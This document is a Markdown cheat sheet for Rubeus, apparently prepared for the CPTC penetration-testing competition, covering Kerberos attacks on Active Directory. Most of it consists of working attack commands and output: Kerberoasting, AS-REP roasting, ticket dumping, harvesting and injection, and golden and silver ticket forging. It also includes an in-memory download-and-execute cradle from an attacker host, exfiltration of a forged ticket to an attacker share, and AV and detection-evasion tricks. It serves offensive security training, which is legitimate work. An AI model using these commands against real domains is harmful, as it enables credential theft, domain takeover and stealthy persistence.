# Rubeus - CPTC Quick Reference

## What is Rubeus & Why It's Critical

**Rubeus = Kerberos attack toolkit for Windows (C# .NET)**

**Why you need it for CPTC:**
- ✅ Kerberoasting from Windows (faster than Impacket)
- ✅ AS-REP roasting from compromised Windows box
- ✅ Pass-the-Ticket attacks
- ✅ Golden/Silver ticket creation
- ✅ Ticket harvesting from memory
- ✅ Better than Mimikatz for Kerberos-only attacks

**When to use:** You have access to Windows machine (even without admin)

**Time to value:** 30 seconds to 2 minutes per attack

---

## Installation & Execution

### Download

```powershell
# Download from GitHub releases
# https://github.com/GhostPack/Rubeus/releases

# Or compile from source (requires Visual Studio)
git clone https://github.com/GhostPack/Rubeus
# Open Rubeus.sln in Visual Studio → Build
```

---

### Execution Methods

**Method 1: Direct Execution (If AV/EDR Allows)**
```powershell
.\Rubeus.exe kerberoast
```

**Method 2: In-Memory (Bypass AV)**
```powershell
# From remote host
IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command "kerberoast"
```

**Method 3: Cobalt Strike / C2**
```
execute-assembly C:\Tools\Rubeus.exe kerberoast
```

**Method 4: Renamed (Basic AV Bypass)**
```powershell
# Rename to something innocuous
cp Rubeus.exe Update-Helper.exe
.\Update-Helper.exe kerberoast
```

---

## Core Attacks - When to Use What

| Attack | Use When | Admin Required? | Output | Time |
|--------|----------|-----------------|--------|------|
| **kerberoast** | Need service account creds | No | Crackable hashes | 30 sec |
| **asreproast** | Have usernames, no creds | No | Crackable hashes | 30 sec |
| **ptt** | Have stolen ticket | No (usually) | Ticket injected | 5 sec |
| **triage** | See what tickets exist | Yes (own session) | Ticket list | 5 sec |
| **dump** | Steal all tickets | Yes (SYSTEM) | .kirbi files | 10 sec |
| **monitor** | Wait for DA ticket | Yes | Real-time capture | Continuous |
| **golden** | Create persistence | Need krbtgt hash | TGT | 10 sec |
| **silver** | Access specific service | Need service hash | TGS | 10 sec |

---

## 1. Kerberoasting (Most Common)

### Basic Kerberoasting

**When:** You have domain user access (even low-privilege)

```powershell
# Find and request all SPNs
Rubeus.exe kerberoast

# Output:
# [*] Action: Kerberoasting
# [*] Target Domain: corp.local
# 
# [*] Searching path 'LDAP://DC01.corp.local/DC=corp,DC=local' for SPNs
# [*] Total kerberoastable users: 3
# 
# [*] SamAccountName         : sqlservice
# [*] DistinguishedName      : CN=SQL Service,OU=Service Accounts,DC=corp,DC=local
# [*] ServicePrincipalName   : MSSQLSvc/SQL01.corp.local:1433
# [*] PwdLastSet             : 3/15/2020 10:23:45 AM
# [*] Supported ETypes       : RC4_HMAC_DEFAULT
# [*] Hash                   : $krb5tgs$23$*sqlservice$corp.local$MSSQLSvc/SQL01*$ABC123...
```

---

### Save to File (For Offline Cracking)

```powershell
# Hashcat format
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# John format
Rubeus.exe kerberoast /format:john /outfile:hashes.txt
```

**Crack hashes:**
```powershell
# Copy hashes.txt to Kali, then:
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

### Target Specific User/SPN

```powershell
# Specific user
Rubeus.exe kerberoast /user:sqlservice

# Specific SPN
Rubeus.exe kerberoast /spn:MSSQLSvc/SQL01.corp.local

# Multiple users
Rubeus.exe kerberoast /user:sqlservice,webservice
```

---

### Advanced Options

```powershell
# Use AES encryption (stealthier, harder to crack)
Rubeus.exe kerberoast /tgtdeleg

# Specify domain controller
Rubeus.exe kerberoast /dc:DC01.corp.local

# Use alternate credentials
Rubeus.exe kerberoast /creduser:CORP\user /credpassword:Password123

# No output, just save to file
Rubeus.exe kerberoast /simple /outfile:hashes.txt
```

---

### Time Expectations

```
Small domain (< 50 users): 10-30 seconds
Medium domain (50-500 users): 30-60 seconds
Large domain (> 500 users): 1-3 minutes
```

---

## 2. AS-REP Roasting

### Basic AS-REP Roasting

**When:** Looking for users with "Do not require Kerberos preauthentication" enabled

```powershell
# Find and roast all vulnerable users
Rubeus.exe asreproast

# Output:
# [*] Action: AS-REP roasting
# [*] Target Domain: corp.local
# 
# [*] SamAccountName         : vulnerable-user
# [*] DistinguishedName      : CN=Vulnerable User,OU=Users,DC=corp,DC=local
# [*] Using domain controller: DC01.corp.local
# [*] Hash                   : $krb5asrep$23$vulnerable-user@corp.local:ABC123...
```

---

### Save to File

```powershell
# Hashcat format
Rubeus.exe asreproast /format:hashcat /outfile:asrep-hashes.txt

# John format  
Rubeus.exe asreproast /format:john /outfile:asrep-hashes.txt
```

**Crack:**
```bash
# On Kali
hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt
```

---

### Target Specific User

```powershell
# Check specific user
Rubeus.exe asreproast /user:vulnerable-user

# Check list of users
Rubeus.exe asreproast /user:user1,user2,user3
```

---

### Advanced Options

```powershell
# Specify domain
Rubeus.exe asreproast /domain:corp.local

# Use alternate credentials
Rubeus.exe asreproast /creduser:CORP\user /credpassword:Pass123

# Specify DC
Rubeus.exe asreproast /dc:DC01.corp.local
```

---

## 3. Pass-the-Ticket (PTT)

### Inject Ticket from File

**When:** You have a .kirbi ticket file (stolen or forged)

```powershell
# Inject ticket into current session
Rubeus.exe ptt /ticket:ticket.kirbi

# Output:
# [*] Action: Import Ticket
# [+] Ticket successfully imported!

# Verify
klist
# Shows injected ticket
```

---

### Inject Multiple Tickets

```powershell
# Inject all .kirbi files in directory
Rubeus.exe ptt /ticket:C:\Tickets\*.kirbi

# Inject base64-encoded ticket
Rubeus.exe ptt /ticket:doIFuj...base64...
```

---

### Use Ticket Immediately

```powershell
# After injection, use for access
dir \\DC01\C$

# Or
PsExec.exe \\DC01 cmd
```

---

## 4. Ticket Triage & Dumping

### Triage (View Tickets)

**When:** Want to see what tickets are in memory (your session)

```powershell
# View current user's tickets
Rubeus.exe triage

# Output:
# ----------------------------------------
#  | LUID    | UserName                 | Service                              | EndTime              |
# ----------------------------------------
#  | 0x3e7   | Administrator@CORP.LOCAL | krbtgt/CORP.LOCAL                    | 10/25/2025 4:38:10 AM|
#  | 0x3e7   | Administrator@CORP.LOCAL | cifs/DC01.corp.local                 | 10/25/2025 4:38:10 AM|
# ----------------------------------------
```

---

### Dump Tickets

**When:** Want to steal tickets from memory (requires admin)

```powershell
# Dump all tickets (requires elevation)
Rubeus.exe dump

# Dump specific LUID
Rubeus.exe dump /luid:0x3e7

# Dump to files
Rubeus.exe dump /outfile:tickets

# Output: Multiple .kirbi files saved
```

---

### Dump Specific User's Tickets

```powershell
# Dump tickets for specific user
Rubeus.exe dump /user:administrator

# Dump service tickets only
Rubeus.exe dump /service:krbtgt
```

---

## 5. Ticket Monitoring (Harvesting)

### Monitor for New Tickets

**When:** Waiting for high-value user (Domain Admin) to authenticate

```powershell
# Monitor every 5 seconds for new 4624 logon events
Rubeus.exe monitor /interval:5

# Monitor and filter for specific user
Rubeus.exe monitor /interval:5 /filteruser:DA-Admin

# Output (when DA logs in):
# [*] 10/24/2025 6:38:10 PM - 4624 logon event for 'CORP\DA-Admin' from '10.10.10.50'
# [*] Requesting TGT for DA-Admin
# [+] TGT request successful!
# [*] base64(ticket.kirbi):
# doIFuj...
```

---

### Monitor Options

```powershell
# Monitor specific interval
Rubeus.exe monitor /interval:10

# Monitor and auto-dump tickets
Rubeus.exe monitor /interval:5 /targetuser:Administrator

# Monitor from specific time
Rubeus.exe monitor /interval:5 /nowrap
```

**Use case:** 
- Run on compromised workstation/server
- Wait for Domain Admin to RDP/access
- Automatically capture DA ticket
- Use ticket for privilege escalation

---

## 6. Golden Ticket Creation

### Prerequisites

**Need:**
- krbtgt account NTLM hash (from DCSync or NTDS.dit)
- Domain SID
- Domain name

**Get krbtgt hash:**
```powershell
# From compromised DC or with DCSync rights
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
# Or from Kali:
impacket-secretsdump 'CORP/admin@DC01' -just-dc-user krbtgt
```

**Get domain SID:**
```powershell
whoami /user
# Output: S-1-5-21-123456789-123456789-123456789-1108
# Domain SID is everything except last part (RID):
# S-1-5-21-123456789-123456789-123456789
```

---

### Create Golden Ticket

```powershell
# Create and inject golden ticket for Administrator
Rubeus.exe golden /rc4:KRBTGT_NTLM_HASH /domain:corp.local /sid:S-1-5-21-XXX-XXX-XXX /user:Administrator /ptt

# With AES256 key (more stealthy)
Rubeus.exe golden /aes256:KRBTGT_AES256_KEY /domain:corp.local /sid:S-1-5-21-XXX-XXX-XXX /user:Administrator /ptt

# Output:
# [*] Action: Build TGT
# [*] Building PAC
# [*] Domain         : CORP.LOCAL
# [*] SID            : S-1-5-21-XXX-XXX-XXX
# [*] UserId         : 500 (Administrator)
# [*] Groups         : 520,512,513,519,518
# [*] ServiceKey     : HASH
# [*] Ticket         : doIFuj...
# [+] Ticket successfully imported!
```

---

### Golden Ticket Options

```powershell
# Specify RID (user ID)
Rubeus.exe golden /rc4:HASH /domain:corp.local /sid:S-1-5-21-XXX /user:FakeAdmin /id:500 /ptt

# Specify groups (privilege assignment)
Rubeus.exe golden /rc4:HASH /domain:corp.local /sid:S-1-5-21-XXX /user:Admin /groups:512,520,519 /ptt
# 512 = Domain Admins
# 520 = Group Policy Creator Owners
# 519 = Enterprise Admins

# Set custom lifetime (default 10 years!)
Rubeus.exe golden /rc4:HASH /domain:corp.local /sid:S-1-5-21-XXX /user:Admin /starttime:"10/24/2025 00:00:00" /endtime:"10/24/2035 00:00:00" /ptt

# Save to file instead of injecting
Rubeus.exe golden /rc4:HASH /domain:corp.local /sid:S-1-5-21-XXX /user:Admin /outfile:golden.kirbi
```

---

### Use Golden Ticket

```powershell
# After injection with /ptt:
klist
# Shows forged TGT

# Access any system in domain
dir \\DC01\C$
PsExec.exe \\FILESERVER cmd
```

---

## 7. Silver Ticket Creation

### What is Silver Ticket?

**Difference from Golden Ticket:**
- Golden = Forged TGT (Ticket Granting Ticket) → Access to everything
- Silver = Forged TGS (Service ticket) → Access to ONE service

**Advantage:** 
- More targeted
- Stealthier (no communication with DC)
- Only need service account hash (not krbtgt)

---

### Create Silver Ticket

```powershell
# Silver ticket for CIFS (file share access)
Rubeus.exe silver /rc4:SERVICE_ACCOUNT_HASH /domain:corp.local /sid:S-1-5-21-XXX /user:Administrator /service:cifs/FILESERVER.corp.local /ptt

# For LDAP access
Rubeus.exe silver /rc4:DC_COMPUTER_ACCOUNT_HASH /domain:corp.local /sid:S-1-5-21-XXX /user:Admin /service:ldap/DC01.corp.local /ptt

# For HOST (remote execution)
Rubeus.exe silver /rc4:SERVICE_HASH /domain:corp.local /sid:S-1-5-21-XXX /user:Admin /service:host/SERVER01.corp.local /ptt
```

---

### Common Service Types

| Service SPN | What it Allows | Hash Needed |
|-------------|----------------|-------------|
| **cifs/server** | File share access (\\server\share) | Computer account hash |
| **http/server** | HTTP/web access | Service account hash |
| **mssql/server** | SQL Server access | SQL service account hash |
| **ldap/server** | LDAP queries | DC computer account hash |
| **host/server** | Remote execution (WinRM, PSExec) | Computer account hash |
| **rpcss/server** | RPC services | Computer account hash |

---

### Silver Ticket Options

```powershell
# Specify target SPN
Rubeus.exe silver /rc4:HASH /domain:corp.local /sid:S-1-5-21-XXX /user:Admin /service:cifs/SERVER.corp.local /ptt

# Use AES256 (stealthier)
Rubeus.exe silver /aes256:AES_KEY /domain:corp.local /sid:S-1-5-21-XXX /user:Admin /service:cifs/SERVER.corp.local /ptt

# Save to file
Rubeus.exe silver /rc4:HASH /domain:corp.local /sid:S-1-5-21-XXX /user:Admin /service:cifs/SERVER.corp.local /outfile:silver.kirbi
```

---

## CPTC Workflows

### Scenario 1: Low-Privilege Domain User on Windows

**Goal:** Escalate to Domain Admin

```powershell
# 1. Kerberoast (2 min)
Rubeus.exe kerberoast /outfile:spn-hashes.txt

# 2. Copy to Kali, crack
# (On Kali)
hashcat -m 13100 spn-hashes.txt rockyou.txt

# 3. If cracked → Use creds
# Back on Windows:
runas /user:CORP\sqlservice "powershell.exe"
# Enter cracked password

# 4. Check if sqlservice has admin rights anywhere
crackmapexec smb 10.10.10.0/24 -u sqlservice -p CrackedPass --local-auth

# 5. If admin on SQL server → Dump more creds
.\Rubeus.exe dump
# Repeat until DA ticket found
```

**Time: 5-10 minutes if weak service account password**

---

### Scenario 2: Compromised Workstation (Non-Admin)

**Goal:** Harvest tickets from memory

```powershell
# 1. Monitor for high-value users
Rubeus.exe monitor /interval:5 /filteruser:Administrator

# 2. Wait for DA to RDP/access this machine
# (Could be minutes to hours)

# 3. When DA ticket captured:
# Rubeus auto-displays base64 ticket
# Copy base64 output

# 4. Inject ticket
Rubeus.exe ptt /ticket:BASE64_TICKET_HERE

# 5. Use DA access
dir \\DC01\C$
```

**Time: Depends on when DA authenticates (could be hours)**

---

### Scenario 3: Domain Admin Achieved, Want Persistence

**Goal:** Create golden ticket for long-term access

```powershell
# 1. Dump krbtgt hash (from DA account)
# Method A: Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
# Get NTLM hash

# Method B: Already have from secretsdump
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f:::
# NTLM hash: 1a2b3c4d5e6f

# 2. Get domain SID
whoami /user
# S-1-5-21-123456789-987654321-111222333-1108
# Domain SID: S-1-5-21-123456789-987654321-111222333

# 3. Create golden ticket
Rubeus.exe golden /rc4:1a2b3c4d5e6f /domain:corp.local /sid:S-1-5-21-123456789-987654321-111222333 /user:Administrator /outfile:golden.kirbi

# 4. Save ticket file securely (exfil, encrypt, hide)
copy golden.kirbi \\attacker-server\loot\

# 5. Later, re-inject for access:
Rubeus.exe ptt /ticket:golden.kirbi
```

**Time: 2 minutes**  
**Persistence: Years (until krbtgt password changed TWICE)**

---

### Scenario 4: Have Computer Account Hash, Want Access

**Goal:** Create silver ticket for specific service

```powershell
# You have: FILESERVER$ computer account hash (from secretsdump)
# FILESERVER$:1105:aad3b435b51404eeaad3b435b51404ee:abc123def456:::
# Hash: abc123def456

# Create silver ticket for CIFS access
Rubeus.exe silver /rc4:abc123def456 /domain:corp.local /sid:S-1-5-21-XXX-XXX-XXX /user:Administrator /service:cifs/FILESERVER.corp.local /ptt

# Access file server
dir \\FILESERVER\C$
dir \\FILESERVER\SharedDocs$
```

**Time: 30 seconds**

---

## Advanced Options & Techniques

### Renew Ticket

```powershell
# Renew ticket before it expires
Rubeus.exe renew /ticket:BASE64_TICKET

# Auto-renew all tickets
Rubeus.exe renew
```

---

### Purge Tickets

```powershell
# Remove all tickets from current session
Rubeus.exe purge

# Remove specific LUID tickets (requires elevation)
Rubeus.exe purge /luid:0x3e7
```

---

### Describe Ticket

```powershell
# Parse and display ticket details
Rubeus.exe describe /ticket:ticket.kirbi

# From base64
Rubeus.exe describe /ticket:BASE64_STRING

# Output shows:
# - User
# - Domain
# - Start/End time
# - Encryption type
# - Service name
# - Flags
```

---

### Hash Ticket

```powershell
# Generate hash of ticket (for deduplication)
Rubeus.exe hash /ticket:ticket.kirbi
```

---

### Ticket Format Conversion

```powershell
# Rubeus outputs .kirbi format
# Convert to other formats with other tools:

# .kirbi → .ccache (for Linux/Impacket)
impacket-ticketConverter ticket.kirbi ticket.ccache

# .ccache → .kirbi
impacket-ticketConverter ticket.ccache ticket.kirbi
```

---

## Rubeus + Other Tools Integration

### Rubeus + Mimikatz

```powershell
# Rubeus: Get tickets
Rubeus.exe dump /outfile:tickets

# Mimikatz: Pass-the-Ticket
mimikatz.exe
kerberos::ptt ticket.kirbi
```

---

### Rubeus + Impacket (Cross-Platform)

```powershell
# Windows (Rubeus): Kerberoast
Rubeus.exe kerberoast /outfile:hashes.txt

# Copy hashes.txt to Kali

# Kali (Impacket): Crack
hashcat -m 13100 hashes.txt rockyou.txt

# Kali (Impacket): Use creds
impacket-psexec 'CORP/sqlservice:CrackedPass@10.10.10.10'
```

---

### Rubeus + Cobalt Strike

```
# Execute Rubeus via beacon
execute-assembly C:\Tools\Rubeus.exe kerberoast /outfile:C:\Temp\hashes.txt

# Download hashes
download C:\Temp\hashes.txt

# Monitor for tickets
execute-assembly C:\Tools\Rubeus.exe monitor /interval:5
```

---

## Detection Evasion

### What Rubeus Creates (Detectable)

**Event Logs:**
- Event ID 4769: Kerberos service ticket requested (Kerberoasting)
- Event ID 4770: Kerberos service ticket renewed
- Event ID 4768: Kerberos TGT requested
- Event ID 4771: Kerberos pre-auth failed (invalid user)

**Network Traffic:**
- Multiple Kerberos AS-REQ/TGS-REQ in short time
- Requests for many SPNs from single host

---

### Evasion Techniques

**1. Slow Down Requests**
```powershell
# No built-in delay in Rubeus
# Workaround: Script to space out requests

$users = Get-Content users.txt
foreach ($user in $users) {
    Rubeus.exe kerberoast /user:$user
    Start-Sleep -Seconds 30
}
```

**2. Use AES Encryption (Stealthier)**
```powershell
# AES instead of RC4 (less commonly monitored)
Rubeus.exe kerberoast /tgtdeleg
```

**3. Target Specific SPNs (Less Noisy)**
```powershell
# Instead of requesting ALL SPNs, target one
Rubeus.exe kerberoast /user:sqlservice
```

**4. Obfuscate Binary**
- Rename Rubeus.exe
- Recompile from source with different name
- Pack/encrypt executable

---

## Common Errors & Fixes

### Error: "[X] KDC_ERR_C_PRINCIPAL_UNKNOWN"

**Cause:** User doesn't exist or wrong domain

**Fix:**
```powershell
# Verify username
net user username /domain

# Check domain name
echo %USERDNSDOMAIN%

# Use correct format:
Rubeus.exe kerberoast /user:DOMAIN\username
```

---

### Error: "[X] Unhandled Rubeus exception: System.AccessViolationException"

**Cause:** .NET version mismatch or corrupted binary

**Fix:**
```powershell
# Re-download Rubeus
# Ensure .NET 4.5+ installed

# Check .NET version
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Version
```

---

### Error: "No users found to Kerberoast"

**Cause:** No SPNs in domain OR no access to query LDAP

**Fix:**
```powershell
# Verify you can query AD
Get-ADUser -Filter * -Properties ServicePrincipalName | Where {$_.ServicePrincipalName}

# Check if SPNs exist
setspn -Q */*

# Specify domain controller
Rubeus.exe kerberoast /dc:DC01.corp.local
```

---

### Error: Access Denied (for dump/triage)

**Cause:** Insufficient privileges

**Fix:**
```powershell
# dump/triage from other user's session requires elevation
# Option 1: Elevate current session
# Option 2: Only triage/dump your own session

# Check current privileges
whoami /priv
```

---

## Time Expectations

| Operation | Expected Time | Notes |
|-----------|---------------|-------|
| Kerberoast (< 50 SPNs) | 30 seconds | Fast |
| Kerberoast (> 100 SPNs) | 1-2 minutes | Slower |
| AS-REP roast | 10-30 seconds | Usually few vulnerable users |
| Pass-the-Ticket | 5 seconds | Very fast |
| Triage | 2 seconds | Instant |
| Dump (all tickets) | 10 seconds | Fast |
| Monitor | Continuous | Hours (waiting for auth) |
| Golden ticket creation | 10 seconds | Fast |
| Silver ticket creation | 10 seconds | Fast |

---

## Quick Command Reference

```powershell
# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /user:sqlservice

# AS-REP roasting
Rubeus.exe asreproast /outfile:asrep.txt
Rubeus.exe asreproast /user:vulnerable-user

# Pass-the-Ticket
Rubeus.exe ptt /ticket:ticket.kirbi

# View tickets
Rubeus.exe triage

# Dump tickets (requires elevation)
Rubeus.exe dump /outfile:tickets

# Monitor for tickets
Rubeus.exe monitor /interval:5

# Golden ticket
Rubeus.exe golden /rc4:KRBTGT_HASH /domain:corp.local /sid:S-1-5-21-XXX /user:Administrator /ptt

# Silver ticket
Rubeus.exe silver /rc4:SERVICE_HASH /domain:corp.local /sid:S-1-5-21-XXX /user:Admin /service:cifs/SERVER.corp.local /ptt

# Purge tickets
Rubeus.exe purge

# Describe ticket
Rubeus.exe describe /ticket:ticket.kirbi
```

---

## CPTC Decision Tree

```
On Windows machine with domain access?
├─ YES (even low-priv user)
│   │
│   ├─ Rubeus.exe kerberoast (30 sec)
│   │   ├─ SPNs found? → Crack hashes → Use creds
│   │   └─ No SPNs? → Try AS-REP roast
│   │
│   ├─ Rubeus.exe asreproast (30 sec)
│   │   ├─ Vulnerable users? → Crack → Use creds
│   │   └─ None? → Monitor or move on
│   │
│   └─ Have admin rights?
│       ├─ YES → Rubeus.exe dump → Steal tickets
│       └─ NO → Rubeus.exe monitor (background)
│
└─ NO (using Kali/Linux)
    └─ Use Impacket instead:
        - GetUserSPNs.py (Kerberoasting)
        - GetNPUsers.py (AS-REP roasting)
```

---

## Evidence Collection

**For Kerberoasting finding:**
```
Command: Rubeus.exe kerberoast /outfile:hashes.txt

Output: 3 SPN accounts found
- sqlservice (MSSQLSvc/SQL01:1433)
- webservice (HTTP/web01)  
- backupservice (backupexec/backup01)

Hash cracked: sqlservice:SQLPass123!

Impact: Service account 'sqlservice' has weak password.
Account has admin rights on SQL01, SQL02, SQL03.
Full database access achieved.
```

---

## Final Tips for CPTC

**Speed Optimization:**
1. Kerberoast first (30 sec, high success rate)
2. Start hash cracking in background (Kali)
3. Try AS-REP roast while hashes crack (30 sec)
4. Move on if no quick wins (don't wait > 5 min for cracks)

**Common Mistakes:**
- Running Kerberoast without saving output (copy/paste fails)
- Not checking if cracked account has admin rights
- Spending too long monitoring (move to active attacks)
- Forgetting to convert .kirbi to .ccache for Impacket

**Golden Rules:**
- ✅ Kerberoast ALWAYS (even if no admin)
- ✅ Try AS-REP roast (often overlooked, easy wins)
- ✅ Save all output to files
- ✅ Transfer tickets to Kali for use with Impacket
- ✅ Use golden ticket for persistence if you get krbtgt hash

**Time Budget:**
```
Kerberoast: 1 minute
AS-REP roast: 1 minute
Crack attempts: 5 minutes max
If no cracks: Move to other attacks
Total: 7-10 minutes maximum
```

**Integration Path:**
```
Rubeus → Hashes → Hashcat → Creds → Impacket/Rubeus → More Access → Repeat
```

**Remember:** Rubeus is Windows-only. Know Impacket equivalents for Linux!
